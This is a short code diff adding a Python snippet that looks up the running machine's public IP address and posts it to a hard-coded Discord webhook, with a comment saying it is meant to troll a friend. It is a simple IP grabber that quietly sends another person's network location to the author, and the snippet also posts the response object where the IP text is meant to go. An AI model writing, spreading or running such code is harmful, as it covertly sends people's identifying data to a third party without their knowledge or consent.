@@ -1,0 +1,7 @@
+# btw idgaf if you use this code or the webhook im just trolling my friend
+
+ip = requests.get("http://ipinfo.io/ip")
+contents = {
+        "content": ip
+        }
+requests.post("https://discord.com/api/webhooks/1531732575473635469/uFjUG_Vk89WtpFF2XcvA_6bUrZsexqIDWyWLxwoz8Fh5c5c8Tj4_Lni567sSWZZy_VUZ", data=contents)
